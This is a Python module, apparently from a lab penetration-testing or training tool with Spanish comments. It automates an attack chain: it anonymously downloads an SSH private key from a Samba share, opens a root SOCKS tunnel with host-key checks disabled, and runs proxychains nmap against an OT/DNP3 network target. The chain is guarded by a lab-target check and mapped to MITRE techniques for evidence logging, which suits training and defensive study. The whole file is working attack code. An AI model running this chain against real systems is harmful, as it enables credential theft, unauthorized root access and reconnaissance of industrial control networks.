#!/usr/bin/env python3
"""Pivoting por Samba: smbclient anónimo -> clave SSH -> túnel SOCKS -> nmap."""

import os

import config
from core import runner, evidence

_KEY_LOCAL = os.path.join(config.WORK_DIR, "id_rsa")


def download_key(sink=None):
    """smbclient anónimo: descarga id_rsa del recurso compartido Samba."""
    path = evidence.new_evidence_file("samba", "download_key")
    evidence.header(path, "Samba - Descarga de clave SSH sin autenticar",
                    f"//{config.SAMBA_HOST}/{config.SAMBA_SHARE}",
                    config.MITRE_MAP["samba.download_key"])
    runner.assert_lab_target(config.SAMBA_HOST)
    # smbclient escribe id_rsa en el cwd; usamos WORK_DIR como cwd
    if os.path.exists(_KEY_LOCAL):
        os.remove(_KEY_LOCAL)
    runner.run_command(
        ["smbclient", f"//{config.SAMBA_HOST}/{config.SAMBA_SHARE}", "-N",
         "-c", "cd ssh_keys; get id_rsa"],
        path, sink=sink, timeout=60, cwd=config.WORK_DIR)
    if os.path.exists(_KEY_LOCAL):
        os.chmod(_KEY_LOCAL, 0o600)
        runner.log(f"[+] Clave descargada en {_KEY_LOCAL} (chmod 600).", path, sink)
    else:
        runner.log("[-] No se pudo descargar la clave (¿está arriba srv_empresa?).", path, sink)
    return path


def open_tunnel(sink=None):
    """Levanta el túnel dinámico SOCKS en segundo plano (ssh -D 9050)."""
    path = evidence.new_evidence_file("samba", "open_tunnel")
    evidence.header(path, "Samba - Túnel dinámico SOCKS (ssh -D 9050)",
                    f"root@{config.SAMBA_HOST}", config.MITRE_MAP["samba.open_tunnel"])
    runner.assert_lab_target(config.SAMBA_HOST)
    if not os.path.exists(_KEY_LOCAL):
        runner.log("[-] No existe id_rsa; ejecuta primero 'Descargar clave'.", path, sink)
        return path
    # Cerramos túneles previos para no acumular procesos
    runner.run_command(["pkill", "-f", "ssh -i .*-D 9050"], path, sink=sink,
                       timeout=10, shell=False)
    runner.run_command(
        ["ssh", "-i", _KEY_LOCAL,
         "-o", "StrictHostKeyChecking=no",
         "-o", "UserKnownHostsFile=/dev/null",
         f"root@{config.SAMBA_HOST}", "-D", "9050", "-N", "-f"],
        path, sink=sink, timeout=30)
    runner.log("[+] Túnel SOCKS5 establecido en 127.0.0.1:9050 (si no hubo error).", path, sink)
    return path


def scan_via_tunnel(target=None, port=None, sink=None):
    """proxychains nmap a través del túnel contra un objetivo de la red OT."""
    target = runner.assert_lab_target(target or config.DNP3_DEFAULT_TARGET)
    port = port or config.DNP3_DEFAULT_PORT
    path = evidence.new_evidence_file("samba", "scan_via_tunnel")
    evidence.header(path, "Samba - Escaneo de red OT a través del túnel",
                    f"{target}:{port}", config.MITRE_MAP["samba.scan_via_tunnel"])
    runner.run_command(
        ["proxychains", "nmap", "-sT", "-Pn", "-p", str(port), target],
        path, sink=sink, timeout=300)
    return path


def full_chain(target=None, port=None, sink=None):
    """Encadena descarga de clave -> túnel -> escaneo por el túnel."""
    download_key(sink=sink)
    open_tunnel(sink=sink)
    return scan_via_tunnel(target=target, port=port, sink=sink)
